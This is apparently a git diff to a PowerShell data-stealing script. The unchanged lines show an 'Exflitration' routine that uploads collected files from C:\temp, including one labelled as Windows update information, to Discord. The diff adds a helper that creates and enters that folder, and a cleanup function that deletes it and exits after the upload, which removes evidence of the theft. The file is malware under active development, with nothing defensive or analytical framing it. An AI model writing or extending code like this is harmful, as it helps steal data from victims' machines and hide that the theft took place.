@@ -1,3 +1,21 @@
+# Function to handle the temporary directory
+function TempDir {
+    # Check if the C:\temp directory exists
+    if (Test-Path -Path "C:\temp" -PathType Container) {
+        # The folder exists
+
+        # Check if the current directory is C:\temp
+        if (-not (Get-Location).Path -eq "C:\temp") {
+            # If not, change the directory
+            Set-Location -Path "C:\temp"
+        }
+    } else {
+        # The folder does not exist, create it, and change the directory
+        New-Item -Path "C:\" -Name "temp" -ItemType Directory
+        Set-Location -Path "C:\temp"
+    }
+}
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -106,11 +124,16 @@ function Exflitration {
         Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
     }
 
-    function Del-Nirsoft-File {
-        cd C:\
-        rmdir -R \temp
-        exit
-    }
+# Function to delete the temporary directory
+function DelTempDir {
+    cd C:\
+    rmdir -R \temp
+    exit
+}
+
 
 #Call Exflitration
 Exflitration
+
+#Call DelTempDir
+DelTempDir
